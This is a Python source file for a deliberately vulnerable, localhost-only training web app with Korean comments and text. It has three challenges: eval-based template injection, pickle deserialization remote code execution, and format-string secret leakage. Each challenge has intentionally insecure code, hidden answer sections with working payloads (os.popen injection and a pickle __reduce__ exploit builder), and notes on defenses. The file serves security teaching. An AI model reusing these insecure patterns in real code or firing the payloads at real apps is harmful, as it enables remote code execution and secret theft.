#!/usr/bin/env python3
"""
4단계 취약 웹앱 (중상~상, 교육용, localhost 전용).

1~2단계가 입력을 문자열로 다루는 결함(SQLi/XSS/명령주입)이었다면,
4단계는 서버가 사용자 입력을 '코드/객체'로 해석하는 결함을 다룹니다.
잘못 신뢰한 데이터 한 조각이 곧바로 원격 코드 실행(RCE)이나 서버 비밀 유출로 이어집니다.

경고: 고의로 취약. 127.0.0.1 에서 학습용으로만.
의존성 없음 (Python 표준 라이브러리만). 실행: python vuln_app.py  →  http://127.0.0.1:8003

포함 챌린지:
  1. SSTI — eval 기반 템플릿 엔진에 {{ 표현식 }} 주입 → 파이썬 코드 실행(RCE)
  2. pickle 역직렬화 RCE — base64 쿠키/파라미터를 pickle.loads → __reduce__ 로 명령 실행
  3. format-string 정보 유출 — str.format 에 사용자 포맷 → 객체 그래프 타고 서버 비밀 누출
"""

import base64
import html
import os
import pickle
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HOST, PORT = "127.0.0.1", 8003

# 서버가 감추고 있는 비밀. RCE/유출로 이 값들에 도달하는 것이 목표.
SECRET = "FLAG{format_string_leak}"          # format-string 유출의 표적
APP_SECRET_KEY = "sup3r_s3cret_signing_key"  # 함께 새어나가는 민감 설정

# whoami 를 실제로 실행하기 어려운 환경을 위한 대비책: 심어둔 비밀 파일.
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PWNED_FILE = os.path.join(BASE_DIR, "PWNED.txt")


def ensure_planted_files():
    # RCE 성공 증거로 읽어낼 수 있는 파일을 심어둔다.
    if not os.path.exists(PWNED_FILE):
        with open(PWNED_FILE, "w", encoding="utf-8") as f:
            f.write("PWNED{code_execution_confirmed} — 이 파일을 읽었다면 코드 실행에 성공한 것입니다.")


# --------------------------------------------------------------------------
# HTML 레이아웃 (hack1/hack2 와 동일 톤, 이 단계는 보라색 계열)
# --------------------------------------------------------------------------
CSS = """
<style>
  body{font-family:system-ui,Segoe UI,Arial,sans-serif;max-width:900px;margin:0 auto;
       padding:1rem;background:#120d1a;color:#e6e6e6;line-height:1.5}
  a{color:#c9a6ff} h1,h2{color:#fff}
  nav{display:flex;gap:.6rem;flex-wrap:wrap;padding:.75rem 0;border-bottom:1px solid #333;margin-bottom:1rem}
  nav a{padding:.3rem .6rem;background:#1e1630;border-radius:6px;text-decoration:none}
  .card{background:#1a1329;border:1px solid #2f2440;border-radius:10px;padding:1rem;margin:1rem 0}
  .hint{background:#1a1226;border-left:3px solid #a06cff;padding:.6rem .9rem;margin:.6rem 0;border-radius:4px}
  .flag{color:#7ee787;font-weight:bold}
  input,textarea{background:#120d1a;color:#e6e6e6;border:1px solid #46375a;border-radius:6px;
                 padding:.45rem;font-size:1rem;width:100%;max-width:520px;box-sizing:border-box}
  button{background:#7c3aed;color:#fff;border:0;border-radius:6px;padding:.5rem 1rem;
         font-size:1rem;cursor:pointer;margin-top:.5rem}
  code,pre{background:#0d0814;padding:.15rem .35rem;border-radius:4px;color:#d2a8ff}
  pre{padding:.8rem;overflow:auto;display:block}
  .warn{background:#3a1414;border:1px solid #7a2222;padding:.6rem;border-radius:8px;color:#ffb4b4}
  details summary{cursor:pointer;color:#a06cff}
  label{display:block;margin:.5rem 0 .2rem}
  .lvl{font-size:.8rem;background:#2a1a3a;color:#c9a6ff;padding:.1rem .5rem;border-radius:10px}
</style>
"""

NAV = """
<nav>
  <a href="/">🏠 홈</a>
  <a href="/render">1. SSTI (eval)</a>
  <a href="/session">2. pickle 역직렬화</a>
  <a href="/greeting">3. format-string 유출</a>
</nav>
"""


def page(title, body):
    return f"""<!doctype html><html lang="ko"><head><meta charset="utf-8">
<title>{title}</title>{CSS}</head><body>{NAV}{body}</body></html>""".encode("utf-8")


# --------------------------------------------------------------------------
def view_home():
    body = """
    <h1>💥 4단계 취약 웹앱 <span class="lvl">중상~상 · RCE</span></h1>
    <div class="warn">고의로 취약. 127.0.0.1 학습 전용. 외부 노출 금지.
    이 단계의 챌린지는 실제로 <b>서버에서 코드가 실행</b>됩니다 — 반드시 본인 PC에서만.</div>
    <p>여기서는 서버가 사용자 입력을 단순한 '문자열'이 아니라
    <b>코드(표현식)</b>·<b>객체(직렬화 데이터)</b>·<b>포맷 스펙</b>으로 해석합니다.
    신뢰해서는 안 될 데이터를 해석하는 순간, 한 줄의 입력이 RCE가 됩니다.</p>
    <div class="card">
      <h2>이 단계에서 새로 배우는 것</h2>
      <ul>
        <li><b>SSTI</b> — 템플릿 엔진이 <code>{{ 표현식 }}</code>을 <code>eval</code>로 계산 →
            <code>{{7*7}}</code>이 <code>49</code>가 되면 이미 임의 파이썬 실행이 가능</li>
        <li><b>pickle 역직렬화</b> — <code>pickle.loads</code>는 데이터를 읽는 게 아니라
            <code>__reduce__</code>가 시키는 대로 <b>코드를 실행</b>한다</li>
        <li><b>format-string 유출</b> — <code>str.format</code>은 <code>{0.__class__}</code>처럼
            객체 그래프를 타고 들어가 서버 내부 값을 끌어낼 수 있다</li>
      </ul>
    </div>
    <div class="card"><b>목표 FLAG 3개:</b>
      SSTI로 <code>whoami</code>/비밀파일 실행, pickle 페이로드로 코드 실행,
      포맷 문자열로 서버 <code>SECRET</code> 유출 — 각각에서 FLAG를 얻으세요.</div>
    """
    return page("4단계 취약 웹앱", body)


# --------------------------------------------------------------------------
# 1) SSTI — eval 기반 템플릿 엔진
# --------------------------------------------------------------------------
def render_template(tmpl, context):
    """{{ ... }} 안의 표현식을 eval 로 계산하는 손수 만든 템플릿 엔진.

    취약: 사용자 입력을 그대로 eval() 에 넘긴다. context 만 쓰라는 '의도'는
    파이썬 표현식 앞에서 아무 방어가 되지 못한다(__import__, builtins 접근 가능).
    """
    out = []
    i = 0
    while i < len(tmpl):
        start = tmpl.find("{{", i)
        if start == -1:
            out.append(tmpl[i:])
            break
        out.append(tmpl[i:start])
        end = tmpl.find("}}", start)
        if end == -1:
            out.append(tmpl[start:])
            break
        expr = tmpl[start + 2:end].strip()
        try:
            # 취약: 사용자 표현식을 eval. context 를 지역변수로 주지만 제한이 아니다.
            value = eval(expr, {}, dict(context))
        except Exception as e:
            value = f"[오류: {e}]"
        out.append(str(value))
        i = end + 2
    return "".join(out)


def view_render(params):
    tmpl = params.get("tmpl", [""])[0]
    rendered = ""
    if tmpl:
        # 인사 카드를 사용자 템플릿으로 렌더. name 정도만 쓰라는 게 '의도'.
        result = render_template(tmpl, {"name": "손님", "site": "My Blog"})
        flag = ""
        # RCE 성공(주입한 명령 출력이 실제로 렌더 결과에 등장)했을 때만 FLAG 노출.
        low = result.lower()
        if os.environ.get("USERNAME", "\0") in result or "pwned{" in low or "uid=" in low:
            flag = '<p class="flag">🎉 FLAG{ssti_eval_rce} — 템플릿 엔진에서 임의 코드를 실행했습니다!</p>'
        rendered = f"<div class='card'>렌더 결과:<br><pre>{html.escape(result)}</pre>{flag}</div>"
    body = f"""
    <h1>1. SSTI — 서버측 템플릿 주입 (eval 엔진)</h1>
    <div class="card">
      <form method="get">
        <label>인사 카드 템플릿 (<code>{{{{ name }}}}</code> 처럼 쓰면 값이 채워집니다)</label>
        <input name="tmpl" value="{html.escape(tmpl)}" placeholder="안녕하세요, {{{{ name }}}}님!">
        <button>렌더</button>
      </form>
      {rendered}
    </div>
    <p><b>🎯 목표:</b> 템플릿 안에 파이썬 표현식을 주입해, 인사말이 아니라
    <b>서버 명령 실행 결과</b>(예: <code>whoami</code>)나 심어둔 비밀 파일을 화면에 띄우세요.</p>
    <div class="hint">💡 힌트 1: 먼저 주입이 되는지 확인 —
      <code>{{{{ 7*7 }}}}</code> 을 넣어 <code>49</code> 가 나오면 표현식이 실제로 평가되는 겁니다.</div>
    <div class="hint">💡 힌트 2: 파이썬 표현식이면 무엇이든 됩니다. 내장 함수로 모듈을 불러올 수 있어요 —
      <code>__import__('os')</code> 로 <code>os</code> 모듈에 접근해 보세요.</div>
    <div class="hint">💡 힌트 3: <code>os.popen('명령').read()</code> 는 명령의 표준출력을 문자열로 돌려줍니다.</div>
    <details><summary>정답 보기</summary>
      <p>주입 확인: <code>{{{{ 7*7 }}}}</code> → <code>49</code></p>
      <p>명령 실행(Windows/공통): <code>{{{{ __import__('os').popen('whoami').read() }}}}</code>
      → 현재 사용자명이 렌더됩니다.</p>
      <p>심어둔 비밀 파일 읽기:
      <code>{{{{ open(__import__('os').path.join(__import__('os').path.dirname(__import__('os').getcwd()),'x'),'r') }}}}</code>
      보다 간단히, 같은 폴더의 파일은
      <code>{{{{ __import__('os').popen('type PWNED.txt').read() }}}}</code> (cmd)로 읽을 수 있습니다.</p>
      <p>명령 출력이 렌더 결과에 실제로 나타나면 <span class="flag">FLAG{{ssti_eval_rce}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 사용자 입력을 <code>eval</code>/<code>exec</code>에 절대 넣지 마세요.
      검증된 <b>샌드박스 템플릿 엔진</b>(Jinja2의 <code>SandboxedEnvironment</code> 등)을 쓰고,
      템플릿 자체를 사용자에게 받지 말고 <b>값(context)만</b> 받으세요.</div>
    """
    return page("SSTI", body)


# --------------------------------------------------------------------------
# 2) pickle 역직렬화 RCE
# --------------------------------------------------------------------------
class Prefs:
    # 앱이 쿠키에 담아 다니는 정상 객체(사용자 환경설정).
    def __init__(self, theme="dark", lang="ko"):
        self.theme = theme
        self.lang = lang

    def __repr__(self):
        return f"Prefs(theme={self.theme!r}, lang={self.lang!r})"


def default_prefs_cookie():
    # 기본 환경설정 객체를 pickle→base64 로 인코딩한 '정상' 쿠키 값.
    return base64.urlsafe_b64encode(pickle.dumps(Prefs())).decode()


def view_session(params, cookie_prefs):
    # 취약: prefs 파라미터/쿠키를 base64 디코드 후 pickle.loads.
    raw_b64 = params.get("prefs", [cookie_prefs or default_prefs_cookie()])[0]
    result = ""
    if raw_b64:
        try:
            blob = base64.urlsafe_b64decode(raw_b64.encode())
            # 취약의 핵심: 신뢰할 수 없는 바이트를 pickle.loads 로 역직렬화.
            obj = pickle.loads(blob)
            text = repr(obj)
            flag = ""
            low = text.lower()
            if os.environ.get("USERNAME", "\0") in text or "pwned{" in low or "uid=" in low:
                flag = '<p class="flag">🎉 FLAG{pickle_deserialization_rce} — 역직렬화 과정에서 코드가 실행됐습니다!</p>'
            result = (f"<div class='card'>복원된 환경설정 객체:<br>"
                      f"<pre>{html.escape(text)}</pre>{flag}</div>")
        except Exception as e:
            result = f'<div class="warn">역직렬화 실패: {html.escape(str(e))}</div>'
    demo = default_prefs_cookie()
    body = f"""
    <h1>2. pickle 역직렬화 RCE</h1>
    <p>이 앱은 사용자 환경설정을 <code>pickle</code>로 직렬화해 쿠키/파라미터로 들고 다니고,
    페이지를 열 때 <code>base64</code> 디코드 후 <code>pickle.loads</code>로 되살립니다.</p>
    <div class="card">
      <p>정상 <code>prefs</code> 값(예시): <code>{demo}</code></p>
      <form method="get">
        <label>prefs (base64 로 인코딩된 pickle)</label>
        <input name="prefs" value="{html.escape(params.get("prefs", [""])[0])}"
               placeholder="{demo}">
        <button>복원</button>
      </form>
      {result}
    </div>
    <p><b>🎯 목표:</b> <code>__reduce__</code>가 실행할 코드를 심은 <b>악성 pickle</b>을 만들어,
    역직렬화 시 <code>whoami</code>(또는 심어둔 <code>PWNED.txt</code> 읽기)가 실행되게 하세요.</p>
    <div class="hint">💡 힌트 1: <code>pickle.loads</code>는 데이터를 '읽기'만 하지 않습니다.
      객체의 <code>__reduce__</code>가 돌려준 <b>(콜러블, 인자)</b>를 <b>호출</b>합니다.</div>
    <div class="hint">💡 힌트 2: <code>__reduce__</code>가 <code>(os.system, ("whoami",))</code> 또는
      <code>(os.popen, ("whoami",))</code> 를 돌려주게 만들면, 로드 시 그 명령이 실행됩니다.</div>
    <div class="hint">💡 힌트 3: 화면에 출력을 <b>보이게</b> 하려면 결과를 문자열로 돌려주는
      <code>os.popen(cmd).read()</code>가 편합니다(아래 정답 참고).</div>
    <details><summary>정답(파이썬 페이로드 빌더) 보기</summary>
      <pre>import base64, pickle, os

class Exploit:
    def __reduce__(self):
        # 로드 시 whoami 를 실행하고 그 출력을 결과 객체로 되돌린다.
        return (os.popen, ("whoami",))
        # 파일을 읽는 변형: return (os.popen, ("type PWNED.txt",))

payload = base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode()
print(payload)</pre>
      <p>출력된 문자열을 위 <code>prefs</code> 칸(또는 <code>?prefs=</code> 쿼리)에 넣으면,
      서버가 <code>pickle.loads</code> 하는 순간 <code>whoami</code>가 실행되고
      그 결과(사용자명)가 화면에 나타납니다 → <span class="flag">FLAG{{pickle_deserialization_rce}}</span>.</p>
      <p>참고: <code>os.popen(...)</code>은 파이프 객체를 돌려주지만, 서버가 <code>repr()</code>를
      호출할 때 명령이 이미 실행됩니다. 출력 문자열을 직접 보고 싶으면
      <code>__reduce__</code>에서 <code>(eval, ("__import__('os').popen('whoami').read()",))</code>를
      돌려주도록 바꾸면 됩니다.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 신뢰할 수 없는 데이터를 <b>절대</b> <code>pickle.loads</code> 하지 마세요.
      직렬화가 필요하면 <code>json</code> 처럼 코드 실행이 없는 포맷을 쓰고,
      무결성이 필요하면 서버 비밀로 <b>서명(HMAC)</b>해 변조를 막으세요.</div>
    """
    return page("pickle 역직렬화", body)


# --------------------------------------------------------------------------
# 3) format-string 정보 유출
# --------------------------------------------------------------------------
class AppConfig:
    # 앱 설정 객체. 여기에 서버 비밀이 매달려 있다.
    def __init__(self):
        self.name = "My Blog"
        self.version = "1.0"
        self.secret = SECRET            # 직접 매달린 비밀
        self.secret_key = APP_SECRET_KEY


APP = AppConfig()


def view_greeting(params):
    tmpl = params.get("tmpl", [""])[0]
    rendered = ""
    if tmpl:
        # 취약: 사용자 포맷 문자열을 str.format 에 그대로. 인자로 넘긴 app 객체의
        # 속성 그래프를 타고 들어가 서버 비밀에 도달할 수 있다.
        try:
            result = tmpl.format(name="손님", app=APP)
        except Exception as e:
            result = f"[포맷 오류: {e}]"
        flag = ""
        if SECRET in result:
            flag = '<p class="flag">🎉 서버 SECRET 유출 성공!</p>'
        rendered = f"<div class='card'>메시지 미리보기:<br><pre>{html.escape(result)}</pre>{flag}</div>"
    body = f"""
    <h1>3. format-string 정보 유출</h1>
    <p>알림 메시지 템플릿을 직접 꾸밀 수 있습니다. 서버는 여기에 <code>name</code> 과
    앱 설정 객체 <code>app</code> 을 넣어 <code>"...".format(name=..., app=APP)</code> 로 렌더합니다.</p>
    <div class="card">
      <form method="get">
        <label>메시지 템플릿 (<code>{{name}}</code>, <code>{{app.name}}</code> 등 사용 가능)</label>
        <input name="tmpl" value="{html.escape(tmpl)}" placeholder="{{name}}님 환영합니다! ({{app.name}} v{{app.version}})">
        <button>미리보기</button>
      </form>
      {rendered}
    </div>
    <p><b>🎯 목표:</b> 서버가 숨기고 있는 <code>SECRET</code> 값을 포맷 문자열로 끌어내세요.
    (정상 사용자에겐 <code>name</code>·<code>app.name</code>·<code>app.version</code>만 쓰라는 의도입니다.)</p>
    <div class="hint">💡 힌트 1: <code>str.format</code>은 속성 접근을 허용합니다 —
      <code>{{app.name}}</code>이 되면 <code>{{app.버전이_아닌_다른_속성}}</code>도 됩니다.</div>
    <div class="hint">💡 힌트 2: <code>app</code> 객체에 어떤 속성들이 매달려 있을까요?
      설정 객체에는 보통 비밀 키 같은 것도 함께 들어 있습니다.</div>
    <div class="hint">💡 힌트 3: 객체 내부는 <code>{{app.__dict__}}</code> 로 통째로 들여다볼 수도 있습니다.</div>
    <details><summary>정답 보기</summary>
      <p>직접 접근: <code>{{app.secret}}</code> → 서버의 <code>SECRET</code> 이 그대로 찍힙니다.</p>
      <p>더 일반적인 기법(속성명을 몰라도): <code>{{app.__dict__}}</code> 로 설정 객체의 모든 필드를 덤프,
      또는 클래스/전역을 타고 올라가는 <code>{{app.__init__.__globals__[SECRET]}}</code> 형태.</p>
      <p><code>SECRET</code> 값이 화면에 나타나면 그 자체가 답 — <span class="flag">FLAG{{format_string_leak}}</span>.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 사용자 문자열을 <b>포맷 문자열로</b> 쓰지 마세요
      (<code>user_input.format(...)</code>·<code>f-string</code> 금지). 값은 인자로만 넘기고,
      정말 사용자 템플릿이 필요하면 속성 접근이 없는 안전한 치환(<code>string.Template</code>)을 쓰세요.</div>
    """
    return page("format-string 유출", body)


# --------------------------------------------------------------------------
# HTTP 핸들러
# --------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _send(self, content, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _cookie_prefs(self):
        raw = self.headers.get("Cookie", "")
        for part in raw.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                if k == "prefs":
                    return v
        return None

    def _route(self, method):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)
        body_params = {}
        if method == "POST":
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            body_params = urllib.parse.parse_qs(raw)
            # POST 로 온 값도 동일하게 처리(폼/도구 편의)
            for k, v in body_params.items():
                params.setdefault(k, v)

        if path == "/":
            self._send(view_home())
        elif path == "/render":
            self._send(view_render(params))
        elif path == "/session":
            self._send(view_session(params, self._cookie_prefs()))
        elif path == "/greeting":
            self._send(view_greeting(params))
        else:
            self._send(page("404", "<h1>404 Not Found</h1>"), status=404)

    def do_GET(self):
        self._route("GET")

    def do_POST(self):
        self._route("POST")

    def log_message(self, fmt, *args):
        print("[req]", self.address_string(), fmt % args)


def main():
    ensure_planted_files()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"4단계 취약 웹앱 실행 중 → http://{HOST}:{PORT}  (Ctrl+C 로 종료)")
    print("경고: localhost 전용. 외부에 노출하지 마세요. (이 단계는 실제로 서버 코드가 실행됩니다)")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n종료합니다.")
        server.shutdown()


if __name__ == "__main__":
    main()
